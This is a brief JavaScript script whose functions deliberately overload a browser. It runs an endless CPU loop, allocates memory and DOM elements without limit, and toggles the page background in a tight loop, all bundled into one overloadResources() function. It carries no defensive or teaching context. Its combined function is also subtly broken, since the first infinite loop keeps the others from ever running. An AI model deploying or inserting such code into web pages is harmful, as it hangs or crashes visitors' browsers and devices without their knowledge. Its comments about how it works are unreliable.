// Function to overload CPU (intense version)
function cpuOverload() {
    while (true) {
        // Infinite loop that performs complex calculations to maximize CPU load
        for (let i = 0; i < 1e7; i++) { // Increase iterations for more load
            Math.pow(Math.random(), Math.random());
        }
    }
}

// Function to overload memory (intense version)
function memoryOverload() {
    let count = 0;
    while (true) {
        let largeArray = new Array(1e6).fill(0).map(() => Math.random()); // Large arrays of random numbers
        let element = document.createElement('div');
        element.textContent = `Overload number: ${count++}`;
        document.body.appendChild(element); // Append to DOM to increase memory consumption
    }
}

// Function to force constant repainting of the browser
function forceRepaint() {
    const body = document.body;
    while (true) {
        body.style.backgroundColor = body.style.backgroundColor === "red" ? "blue" : "red"; // Toggle background color
    }
}

// Combined function to overload both CPU and memory
function overloadResources() {
    cpuOverload(); // Start CPU overload
    memoryOverload(); // Start Memory overload
    forceRepaint(); // Force repaint for additional strain
}